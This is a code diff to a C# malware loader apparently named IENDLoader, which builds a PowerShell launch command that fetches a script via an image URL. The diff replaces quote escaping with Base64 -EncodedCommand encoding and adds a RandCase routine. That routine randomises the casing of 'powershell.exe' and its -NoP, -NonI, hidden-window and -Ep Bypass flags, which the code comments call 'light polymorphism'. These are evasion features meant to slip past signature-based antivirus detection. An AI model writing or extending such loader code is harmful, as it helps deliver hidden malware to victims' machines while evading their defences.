@@ -41,11 +41,18 @@ namespace IENDLoader.Core
                 inlineScript = GenerateManualEntryPointScript(imageUrl, manualEntryPoint, vars);
             }
 
-            // Escape quotes for command line
-            string escapedScript = inlineScript.Replace("\"", "`\"");
+            // Encode the script as UTF-16LE (Unicode) Base64 for -EncodedCommand
+            string encoded = EncodeForEncodedCommand(inlineScript);
 
-            // Generate final command - no -EncodedCommand flag (stealthier)
-            return $"powershell.exe -NoP -NonI -W 1 -Exec Bypass -Command \"{escapedScript}\"";
+            // Light polymorphism: randomize casing of engine and parameters
+            string ps = RandCase("powershell.exe");
+            string noP = RandCase("-NoP");
+            string nonI = RandCase("-NonI");
+            string w = RandCase("-W");
+            string ep = RandCase("-Ep");
+            string enc = RandCase("-Enc");
+
+            return $"{ps} {noP} {nonI} {w} 1 {ep} Bypass {enc} {encoded}";
         }
 
         /// <summary>
@@ -120,6 +127,37 @@ namespace IENDLoader.Core
             }
 
             return variables;
+        }
+
+        /// <summary>
+        /// Encode a PowerShell script for -EncodedCommand (UTF-16LE -> Base64)
+        /// </summary>
+        private static string EncodeForEncodedCommand(string script)
+        {
+            // Important: PowerShell expects Unicode (UTF-16LE)
+            var bytes = Encoding.Unicode.GetBytes(script);
+            return Convert.ToBase64String(bytes);
+        }
+
+        /// <summary>
+        /// Returns a version of the input string with randomized casing for light polymorphism
+        /// </summary>
+        private string RandCase(string s)
+        {
+            var sb = new StringBuilder(s.Length);
+            for (int i = 0; i < s.Length; i++)
+            {
+                char c = s[i];
+                if (char.IsLetter(c))
+                {
+                    sb.Append(_random.Next(2) == 0 ? char.ToLowerInvariant(c) : char.ToUpperInvariant(c));
+                }
+                else
+                {
+                    sb.Append(c);
+                }
+            }
+            return sb.ToString();
         }
 
         /// <summary>
